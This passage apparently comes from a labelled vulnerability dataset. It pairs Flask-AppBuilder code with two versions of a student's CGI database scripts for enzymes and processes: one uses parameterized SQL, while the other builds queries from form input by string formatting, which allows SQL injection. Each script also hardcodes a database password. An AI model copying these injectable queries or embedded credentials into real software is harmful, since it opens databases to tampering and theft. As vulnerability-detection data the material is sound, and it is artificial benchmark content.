IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/n/flask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 1}, {"id": "460d1d24a60ff733c6b060bfe956e46cb2984111", "code": "public_html/cgi-bin/delete.py/n/n#!/usr/bin/python3\n\nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting all the values from the form\nform = cgi.FieldStorage()\nenzyme_name   = form.getvalue('enzyme_name')\nprocess_name  = form.getvalue('process_name')\nenzyme_name2  = form.getvalue('enzyme_name2')\nprocess_name2 = form.getvalue('process_name2')\nenzyme_name3  = form.getvalue('enzyme_name3')\nconc          = form.getvalue(\"conc\")\ncompound      = form.getvalue(\"compound\")\nintermediate  = form.getvalue(\"inter\")\nsub           = form.getvalue(\"sub\")\norganelle     = form.getvalue(\"organelle\")\nenzyme_name3  = form.getvalue(\"enzyme_name3\")\nprocess_name3 = form.getvalue(\"process_name3\")\norganelle2    = form.getvalue(\"organelle2\")\nconc2         = form.getvalue(\"conc2\")\ncompound2     = form.getvalue(\"compound2\")\n\n# establishing connection, cursor\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\nquery = \"\"\ncursor = cnx.cursor()\n\n# depending on the user input- assign the query\n# if multiple text boxes are filled, the last row to be filled in will be executed\nif enzyme_name:\n    query = \"delete from converts where enzyme_name = %s\" \n    v = (enzyme_name,)\n    \nif enzyme_name3:\n    query = \"delete from enzyme where enzyme_name = %s\"\n    v = (enzyme_name3,)\n\nif process_name:\n    query = \"delete from process where process_name = %s\"\n    v = (process_name,)\n    \nif process_name2 and enzyme_name2:\n    query = \"delete from uses where process_name = %s and enzyme_name = %s\" \n    v = (process_name2, enzyme_name2)\n    \nif conc and compound:\n    query = \"delete from conds where concentration = %s and compound = %s\"\n    v = (conc, compound)\n    \nif intermediate:\n    query = \"delete from intermediate where intermediate_name = %s\"\n    v = (intermediate,)\n    \nif organelle and sub:\n    query = \"delete from location where organelle = %s and substructure = %s\"\n    v = (organelle, sub)\n\nif enzyme_name3 and organelle2:\n    query = \"delete from located_in where enzyme_name = %s and organelle = %s\"\n    v = (enzyme_name3, organelle2)\n    \nif process_name3 and conc2 and compound2:\n    query = \"delete from operates_uner where process_name = %s and concentration = %s and compound = %s\"\n    v = (process_name3, conc2, compound2)\n\n# if empty form - give the user an option to fill in something or go back to the home page\nhasError = False\nif not query:\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n\n# checking for errors - if there is an error, show it on the screen\ntry:\n    cursor.execute(query, v)\n    cnx.commit()\n    \nexcept mysql.connector.Error as err:\n    beghtml()\n    print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    endhtm()\n    hasError = True\n\n# otherwise print the repsonse to the screen\nif hasError == False:\n    # html with the response from the delete \n    beghtml()\n    print(\"<h3>Deleted!</h3>\")                                      \n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    endhtml()\n    \ncursor.close()\ncnx.close()\n/n/n/npublic_html/cgi-bin/insert.py/n/n#!/usr/bin/python3                                     \n                                \nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting the values from the html form\nform = cgi.FieldStorage()\ninsert_table = form.getvalue('insert_table')\nvalues       = form.getvalue('values')\n\n# if values were inserted, split on the comma and concatenate the right amount of %s for the prepared statement\nif values:\n    values = values.split(', ')\n    valueQuery = \"(\"\n    for value in values:\n        valueQuery += \"%s, \"\n    valueQuery = valueQuery[:-2] + \")\"\n\n# mysql connection\ncnx = mysql.connector.connect(user='eapfelba', host = 'localhost', database='eapfelba2', password='chumash1000')\nquery=\"\"  # intialized as empty to prevent errors\ncursor = cnx.cursor()\n\n# creating the query based on the user input\n# the insert_table cannot be inserted using prepared statements bc of the implicitly assigned quotes- this is vulnerable to SQL injection (even though only from the drop down)\nif insert_table and values:\n    query = \"insert into \" + insert_table + \" values \" + valueQuery    \n    v = tuple(values)  # making a tuple of the values inputed from the form to put in the execute statement\n    \n# checking for errors\nhasError = False\nif not query:  # empty form\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n    \nif query:\n    try: # try to execute the query, otherwise print out the issue on an html page and give the user options to go back\n        cursor.execute(query, v)\n        cnx.commit()   \n    except mysql.connector.Error as err:\n        beghtml()\n        print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n        endhtml()\n        hasError = True\n\n# if there is no error, print out the results!\nif hasError == False:\n    beghtml()\n    print(\"<h3>\")\n    # print them out in the right format for the results page\n    for s in values:\n        print(\"<b> | %s\" % s)\n    print(\" | </b></h3>\")\n    print(\"<h3>is now in the table %s!</h3>\" % insert_table)\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n    endhtml()\n    \ncursor.close()\ncnx.close()\n/n/n/npublic_html/cgi-bin/select.py/n/n#!/usr/bin/python3                                                                           \nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting values from the form\nform = cgi.FieldStorage()\nsearch_enzyme   = form.getvalue('search_enzyme')\nsearch_process1 = form.getvalue('search_process1')\nsearch_process2 = form.getvalue('search_process2')\nsearch_enzyme2  = form.getvalue(\"search_enzyme2\")\nsearch_process3 = form.getvalue(\"search_process3\")\nsub             = form.getvalue(\"sub\")\ninter           = form.getvalue(\"inter\")\nsearch_process5 = form.getvalue(\"search_process5\")\nsearch_enzyme3  = form.getvalue(\"search_enzyme3\")\nreac            = form.getvalue(\"reac\")\nsearch_enzyme4  = form.getvalue(\"search_enzyme4\")\ninter2          = form.getvalue(\"inter2\")\n\n# establishing sql connection\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\ncursor = cnx.cursor()\nquery = \"\"\nkey = \"\"\n\n# different options to select- assign query based on input\n# the last text box to be filled in on the form will be executed\n# the title helps with printing the result to the html\nif search_enzyme:\n    query = \"select process_name from uses where enzyme_name = %s\"\n    title = \"Processes\"\n    v = (search_enzyme,)\n    \nif search_process1:\n    query = \"select enzyme_name from uses where process_name = %s\"\n    title = \"Enzymes\"\n    v = (search_process1,)\n    \nif search_process2:\n    query = \"select distinct organelle from uses natural join located_in where process_name = %s\"\n    title = \"Organelles\"\n    v = (search_process2,)\n    \nif search_enzyme2:\n    query = \"select ligand_mechanism from enzyme where enzyme_name = %s\"\n    title = \"Ligand Mechanisms\"\n    v = (search_enzyme2,)\n    \nif search_process3:\n    query = \"select goal_product from process where process_name = %s\"\n    title = \"Goal Products\"\n    v = (search_process3,) \n    \nif sub:\n    query = \"select organelle from location where substructure = %s\"\n    title = \"Organelles\"\n    v = (sub,)\n    \nif inter:\n    query = \"select concentration from conds where compound = %s\"\n    title = \"Concentrations\"\n    v = (inter,)\n\n# keep track of an extra variable so that it will know to print an extra line of results (onyl query with a tuple result)\nif search_process5: \n    query = \"select concentration, compound from operates_under where process_name = %s\"\n    title = \"Conditions\"\n    key = 'one'\n    v = (search_process5,)\n    \nif search_enzyme3 and reac:\n    query = \"select product_name from converts where enzyme_name = %s and reactant_name = %s\"\n    title = \"Products\"\n    v = (search_enzyme3, reac)\n    \nif search_enzyme4:\n    query = \"select organelle from located_in where enzyme_name = %s\" \n    title = \"Organelles\"\n    v = (search_enzyme4,)\n    \nif inter2:\n    query = \"select concenration from intermediate where intermediate_name = %s\"\n    title = \"Concentrations\"\n    v = (inter2,)\n\n# avoid error with empty form- give the user option to fill in information or go back to home page\nif not query:\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    \n# catching errors- blank form, wrong syntax, etc\n# try executing query and spit back error to the screen if there is a problem\nhasError = False\nif query:\n    try:\n        cursor.execute(query, v)        \n    except mysql.connector.Error as err:\n        print(\"<b>Something went wrong:</b> {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b>')\n        endhtml()\n        hasError = True\n\n# otherwise, print out the response with links back and to home\nif hasError == False:\n    response = cursor.fetchall()\n    beghtml()\n    if not response:                                                                                     \n        print(\"<h3>no results found</h3>\")\n    else:\n        print(\"<h3>Results!</h3>\")\n        print(\"<h3>%s</h3>\" % title) \n        for r in response:\n            print(\"<b> %s\" % r[0])\n            if key:  # if there was a second value of the data like (concentration, compound)\n                print(\"%s</br>\" % r[1])\n            print(\"<br>\")\n    print(\"</b><br>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b><br><br>')\n    endhtml()\n\ncursor.close()\ncnx.close()\n/n/n/npublic_html/cgi-bin/update.py/n/n#! /usr/bin/python3\n\nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting all the values from the html form\nform = cgi.FieldStorage()\nenzyme_name    = form.getvalue('enzyme_name')\nproduct_name   = form.getvalue('product_name')\nenzyme_name2   = form.getvalue('enzyme_name2')\nmechanism_name = form.getvalue('mechanism_name')\nprocess_name   = form.getvalue('process_name')\nconcentration  = form.getvalue('concentration')\ncompound_name  = form.getvalue('compound_name')\nprocess_name2  = form.getvalue('process_name2')\ngoal           = form.getvalue('goal')\ninter          = form.getvalue('inter')\nconc           = form.getvalue('conc')\nprocess_name3  = form.getvalue('process_name3')\nenzyme_name3   = form.getvalue('enzyme_name3')\nenzyme_name4   = form.getvalue('enzyme_name4')\norganelle      = form.getvalue('organelle')\nsub            = form.getvalue('sub')\norganelle2     = form.getvalue('organelle2')\nsub2           = form.getvalue('sub2')\nconc2          = form.getvalue('conc2')\ncomp           = form.getvalue('comp')\nloc            = form.getvalue('loc')\nsub3           = form.getvalue('sub3')\nsub4           = form.getvalue('sub4')\n\n# establishing connection to the database\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\ncursor = cnx.cursor(buffered=True)\nquery = \"\"  # initializing empty queries to avoid errors\nquery2 = \"\"\n\n# depending on the user input assign the query\n# the second query searches for the updated data in the database and shows the user what they inputed\n# if multiple are filled in, the last one will be executed\nif enzyme_name and product_name:\n    query = \"update converts set product_name = %s where enzyme_name = %s\"\n    v1 = (product_name, enzyme_name)\n    query2 = \"select * from converts where product_name = %s and enzyme_name = %s\"\n    v2 = (product_name, enzyme_name)\n    \nif enzyme_name2 and mechanism_name:\n    query = \"update enzyme set ligand_mechanism = %s where enzyme_name = %s\"\n    v1 = (mechanism_name, enzyme_name2)\n    query2 = \"select * from enzyme where enzyme_name = %s\"\n    v2 = (enzyme_name2,)\n    \nif process_name and concentration and compound_name:\n    query = \"update operates_under set concentration = %s, compound = %s where process_name = %s\"\n    v1 = (concentration, compound_name, process_name)\n    query2 = \"select * from operates_under where process_name = %s\"\n    v2 = (process_name,)\n    \nif process_name2 and goal:\n    query = \"update process set goal_product = %s where process_name = %s\"\n    v1 = (goal, process_name2)\n    query2 = \"select * from process where process_name = %s\"\n    v2 = (process_name2,)\n\nif inter and conc:\n    query = \"update intermediate set concenration = %s where intermediate_name = %s\" \n    v1 = (conc, inter)\n    query2 = \"select * from intermediate where intermediate_name = %s\" \n    v2 = (inter,)\n    \nif process_name3 and enzyme_name3:\n    query = \"update uses set enzyme_name = %s where process_name = %s\"\n    v1 = (enzyme_name3, process_name3)\n    query2 = \"select * from uses where process_name = %s and enzyme_name = %s\"\n    v2 = (process_name3, enzyme_name3)\n    \nif enzyme_name4 and organelle and sub and sub4:\n    query = \"update located_in set organelle = %s, substructure = %s where enzyme_name = %s and substructure = %s\" \n    v1 = (organelle, sub, enzyme_name4, sub4)\n    query2 = \"select * from located_in where enzyme_name = %s\"\n    v2 = (enzyme_name4,)\n    \nif organelle2 and sub2:\n    query = \"update location set substructure = %s where organelle = %s and substructure = %s\"\n    v1 = (sub2, organelle2, sub3)\n    query2 = \"select * from location where organelle = %s and substructure = %s\" \n    v2 = (sub2, organelle2, sub3)\n    \nif conc2 and comp and loc:\n    query = \"update conds set prime_location = %s where concentration = %s and compound = %s\"\n    v1 = (loc, conc2, comp)\n    query2 = \"select * from conds where concentration = %s and compound = %s and prime_location = %s\"\n    v2 = (conc2, comp, loc)\n\nhasError = False\nif not query: # blank form - give the user option to go back or to the home page\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n\nif query: # errors\n    try:\n        cursor.execute(query, v1)\n        cnx.commit()\n\n    except mysql.connector.Error as err:\n        beghtml()\n        print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n        print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n        endhtml()\n        hasError = True\n        \n# if there were no errors when executing the first query, continue executing the second\nif hasError == False:\n    cursor.execute(query2, v2)\n    data = cursor.fetchall()\n    \n    # html with the response from the update           \n    beghtml()\n    \n    # if the first query did not come up with an error but the second did (typo, value not in the table)\n    # i.e. the select statement came up with nothing..\n    # print that something went wrong and give an option to go back\n    if not data:\n        print(\"<h3><b>Something went wrong </b></h3>\")\n        print(\"<b>Check your spelling!</b><br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n        print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    # otherwise, you want to print out what the database not reads\n    else:\n        print(\"<h3>Updated!</h3>\")\n        print(\"The database now reads <br><br>\")\n        for result in data[0]:\n            print(\"<b> | %s\" % result)\n        print(\" | </b>\")\n        print(\"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n    endhtml()\n\n\ncursor.close()\ncnx.close()\n/n/n/n", "label": 0}, {"id": "460d1d24a60ff733c6b060bfe956e46cb2984111", "code": "/public_html/cgi-bin/delete.py/n/n#!/usr/bin/python3\n\nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting all the values from the form\nform = cgi.FieldStorage()\nenzyme_name   = form.getvalue('enzyme_name')\nprocess_name  = form.getvalue('process_name')\nenzyme_name2  = form.getvalue('enzyme_name2')\nprocess_name2 = form.getvalue('process_name2')\nenzyme_name3  = form.getvalue('enzyme_name3')\nconc          = form.getvalue(\"conc\")\ncompound      = form.getvalue(\"compound\")\nintermediate  = form.getvalue(\"inter\")\nsub           = form.getvalue(\"sub\")\norganelle     = form.getvalue(\"organelle\")\nenzyme_name3  = form.getvalue(\"enzyme_name3\")\nprocess_name3 = form.getvalue(\"process_name3\")\norganelle2    = form.getvalue(\"organelle2\")\nconc2         = form.getvalue(\"conc2\")\ncompound2     = form.getvalue(\"compound2\")\n\n# establishing connection, cursor\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\nquery = \"\"\ncursor = cnx.cursor()\n\n# depending on the user input- assign the query\n# if multiple text boxes are filled, the last row to be filled in will be executed\nif enzyme_name:\n    query = \"delete from converts where enzyme_name = '%s'\" % enzyme_name\n\nif enzyme_name3:\n    query = \"delete from enzyme where enzyme_name = '%s'\" % enzyme_name3\n    \nif process_name:\n    query = \"delete from process where process_name = '%s'\" % process_name\n\nif process_name2 and enzyme_name2:\n    query = \"delete from uses where process_name = '%s' and enzyme_name = '%s'\" % (process_name2, enzyme_name2)\n\nif conc and compound:\n    query = \"delete from conds where concentration = '%s' and compound = '%s'\" % (conc, compound)\n\nif intermediate:\n    query = \"delete from intermediate where intermediate_name = '%s'\" % intermediate\n\nif organelle and sub:\n    query = \"delete from location where organelle = '%s' and substructure = '%s'\" % (organelle, sub)\n\nif enzyme_name3 and organelle2:\n    query = \"delete from located_in where enzyme_name = '%s' and organelle = '%s'\" % (enzyme_name3, organelle2)\n\nif process_name3 and conc2 and compound2:\n    query = \"delete from operates_uner where process_name = '%s' and concentration = '%s' and compound = '%s'\" % (process_name3, conc2, compound2)\n\n\n# if empty form - give the user an option to fill in something or go back to the home page\nhasError = False\nif not query:\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n\n# checking for errors - if there is an error, show it on the screen\ntry:\n    cursor.execute(query)\n    cnx.commit()\n    \nexcept mysql.connector.Error as err:\n    beghtml()\n    print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    endhtm()\n    hasError = True\n\n# otherwise print the repsonse to the screen\nif hasError == False:\n    # html with the response from the delete \n    beghtml()\n    print(\"<h3>Deleted!</h3>\")                                      \n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    endhtml()\n    \ncursor.close()\ncnx.close()\n/n/n/n/public_html/cgi-bin/insert.py/n/n#!/usr/bin/python3                                     \n                                \nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting the values from the html form\nform = cgi.FieldStorage()\ninsert_table = form.getvalue('insert_table')\nvalues       = form.getvalue('values')\n\n\nif values:   # make sure not empty to split and then split on the comma\n    values = values.split(', ')\n\nsvalues = \"\"\nif values:\n    for value in values:\n        # concatenate them into the appropriate syntax, removing any unnecessary whitespace\n        svalues += \"'%s', \" % value.strip()\n    svalues = svalues[:-2]\n\n# mysql connection\ncnx = mysql.connector.connect(user='eapfelba', host = 'localhost', database='eapfelba2', password='chumash1000')\nquery=\"\"  # intialized as empty to prevent errors\ncursor = cnx.cursor()\n\n# creating the query based on the user input\nif insert_table and values:\n    query = \"insert into %s values (%s)\" % (insert_table, svalues)\n\n# checking for errors\nhasError = False\nif not query:  # empty form\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n    \nif query:\n    try: # try to execute the query, otherwise print out the issue on an html page and give the user options to go back\n        cursor.execute(query)\n        cnx.commit()   \n    except mysql.connector.Error as err:\n        beghtml()\n        print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n        endhtml()\n        hasError = True\n\n# if there is no error, print out the results!\nif hasError == False:\n    beghtml()\n    print(\"<h3>\")\n    # print them out in the right format for the results page\n    temps = svalues.split(\", \")\n    for s in temps:\n        print(\"<b> | %s\" % s[1:-1])\n    print(\" | </b></h3>\")\n    print(\"<h3>is now in the table %s!</h3>\" % insert_table)\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n    endhtml()\n    \ncursor.close()\ncnx.close()\n/n/n/n/public_html/cgi-bin/select.py/n/n#!/usr/bin/python3                                                                           \nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting values from the form\nform = cgi.FieldStorage()\nsearch_enzyme   = form.getvalue('search_enzyme')\nsearch_process1 = form.getvalue('search_process1')\nsearch_process2 = form.getvalue('search_process2')\nsearch_enzyme2  = form.getvalue(\"search_enzyme2\")\nsearch_process3 = form.getvalue(\"search_process3\")\nsub             = form.getvalue(\"sub\")\ninter           = form.getvalue(\"inter\")\nsearch_process5 = form.getvalue(\"search_process5\")\nsearch_enzyme3  = form.getvalue(\"search_enzyme3\")\nreac            = form.getvalue(\"reac\")\nsearch_enzyme4  = form.getvalue(\"search_enzyme4\")\ninter2          = form.getvalue(\"inter2\")\n\n# establishing sql connection\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\ncursor = cnx.cursor()\nquery = \"\"\nkey = \"\"\n\n# different options to select- assign query based on input\n# 